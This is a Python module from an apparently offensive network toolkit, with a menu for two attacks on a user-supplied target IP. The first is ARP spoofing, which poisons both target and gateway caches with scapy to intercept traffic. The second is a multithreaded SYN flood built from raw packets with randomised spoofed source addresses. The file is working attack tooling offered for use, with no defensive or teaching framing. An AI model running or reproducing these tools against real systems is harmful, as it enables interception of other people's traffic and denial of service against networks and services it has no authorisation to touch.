import os
import sys
import time
import random
import threading
import socket
from colorama import Fore, Style
from scapy.all import ARP, Ether, sendp, srp, conf
from utils.texts import t
from utils.helpers import clear_screen

def check_root():
    if os.geteuid() != 0:
        print(f"{Fore.RED}ERROR: Root required! Use sudo.{Style.RESET_ALL}")
        print(f"{Fore.YELLOW}In Termux: pkg install tsu && sudo python siera.py{Style.RESET_ALL}")
        sys.exit(1)

def get_mac(ip, iface):
    ans, _ = srp(Ether(dst="ff:ff:ff:ff:ff:ff")/ARP(pdst=ip), 
                 timeout=2, iface=iface, verbose=False)
    if ans:
        return ans[0][1].src
    return None

def arp_spoof(target_ip, gateway_ip, iface):
    try:
        target_mac = get_mac(target_ip, iface)
        gateway_mac = get_mac(gateway_ip, iface)
        
        if not target_mac or not gateway_mac:
            print(f"{Fore.RED}[-] Could not get MAC addresses{Style.RESET_ALL}")
            return

        print(f"{Fore.YELLOW}\n[+] Starting ARP Spoofing: {target_ip} -> {gateway_ip}{Style.RESET_ALL}")
        
        def spoof():
            packet1 = Ether(dst=target_mac)/ARP(op=2, psrc=gateway_ip, pdst=target_ip)
            packet2 = Ether(dst=gateway_mac)/ARP(op=2, psrc=target_ip, pdst=gateway_ip)
            
            while arp_spoofing:
                sendp(packet1, iface=iface, verbose=False)
                sendp(packet2, iface=iface, verbose=False)
                time.sleep(2)

        global arp_spoofing
        arp_spoofing = True
        threading.Thread(target=spoof, daemon=True).start()
        
        print(f"{Fore.GREEN}[+] ARP spoofing running! Press Enter to stop...{Style.RESET_ALL}")
        input()
        arp_spoofing = False
        print(f"{Fore.YELLOW}[+] ARP spoofing stopped{Style.RESET_ALL}")
        
    except Exception as e:
        print(f"{Fore.RED}ARP Spoof Error: {e}{Style.RESET_ALL}")

def ddos_attack(target_ip, port, threads=100):
    try:
        print(f"{Fore.RED}\n[+] Starting DDoS (SYN Flood) on {target_ip}:{port}{Style.RESET_ALL}")
        
        def syn_flood():
            while ddos_active:
                try:
                    s = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_TCP)
                    s.setsockopt(socket.IPPROTO_IP, socket.IP_HDRINCL, 1)
                    
                    src_ip = ".".join(str(random.randint(1, 254)) for _ in range(4))
                    packet = (
                        b'\x45\x00\x00\x28\xab\xcd\x00\x00\x40\x06\x00\x00' +
                        socket.inet_aton(src_ip) + 
                        socket.inet_aton(target_ip) +
                        b'\x00\x00' + port.to_bytes(2, 'big') +
                        b'\x00\x00\x00\x00\x00\x00\x00\x00\x50\x02\xff\xff\x00\x00\x00\x00'
                    )
                    s.sendto(packet, (target_ip, 0))
                except:
                    pass
        
        global ddos_active
        ddos_active = True
        for _ in range(threads):
            threading.Thread(target=syn_flood, daemon=True).start()
        
        print(f"{Fore.GREEN}[+] DDoS running! Press Enter to stop...{Style.RESET_ALL}")
        input()
        ddos_active = False
        print(f"{Fore.YELLOW}[+] DDoS stopped{Style.RESET_ALL}")
        
    except Exception as e:
        print(f"{Fore.RED}DDoS Error: {e}{Style.RESET_ALL}")

def network_attacks():
    check_root()
    
    try:
        interfaces = [iface for iface in conf.ifaces.keys() if iface != 'lo']
        if not interfaces:
            interfaces = ['eth0', 'wlan0']
    except:
        interfaces = ['eth0', 'wlan0']
    
    while True:
        clear_screen()
        print(f"\n{Fore.MAGENTA}{t('attack_menu')}{Style.RESET_ALL}")
        print("01. ARP Spoofing (MITM)")
        print("02. DDoS Attack")
        print("00. Back")
        choice = input(t("choose"))
        
        if choice == '01':
            print(f"\n{Fore.CYAN}Available interfaces:{Style.RESET_ALL}")
            for i, iface in enumerate(interfaces, 1):
                print(f"{i}. {iface}")
            iface_idx = int(input("\n> Select interface: ")) - 1
            iface = interfaces[iface_idx]
            
            target_ip = input("> Target IP: ")
            gateway_ip = input("> Gateway IP: ")
            
            arp_spoof(target_ip, gateway_ip, iface)
            input(f"\n{t('press_enter')}")
            
        elif choice == '02':
            target_ip = input("> Target IP: ")
            port = int(input("> Port (80): ") or 80)
            threads = int(input("> Threads (100): ") or 100)
            
            ddos_attack(target_ip, port, threads)
            input(f"\n{t('press_enter')}")
            
        elif choice == '00':
            break
            
        else:
            print(t("error"))
            time.sleep(1)